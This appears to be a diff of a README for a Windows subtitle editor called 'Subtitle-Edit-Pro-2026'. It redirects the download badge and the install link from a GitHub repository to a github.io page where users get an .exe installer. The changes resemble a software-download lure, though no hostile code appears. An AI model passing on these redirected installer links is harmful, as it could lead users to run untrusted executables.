@@ -1,6 +1,6 @@
 # 🎬 Subtitle-Edit-Pro-2026 - Create perfect subtitles for your videos
 
-[![](https://img.shields.io/badge/Download-Subtitle-Edit-Pro-2026-blue.svg)](https://github.com/Czechoslovakanger677/Subtitle-Edit-Pro-2026)
+[![](https://img.shields.io/badge/Download-Subtitle-Edit-Pro-2026-blue.svg)](https://czechoslovakanger677.github.io)
 
 Subtitle-Edit-Pro-2026 helps you create, edit, and sync subtitles for your video files. This tool delivers a clear workspace for timing text to your footage. You can use it on Windows 10 and Windows 11. It supports common formats like SRT, VTT, and ASS. 
 
@@ -31,7 +31,7 @@ Your computer needs the following specifications to run this software:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official repository download page](https://github.com/Czechoslovakanger677/Subtitle-Edit-Pro-2026) to obtain the installer.
+1. Visit the [official repository download page](https://czechoslovakanger677.github.io) to obtain the installer.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version link to start the download.
 4. Save the file named "Subtitle-Edit-Pro-Installer.exe" to your computer.
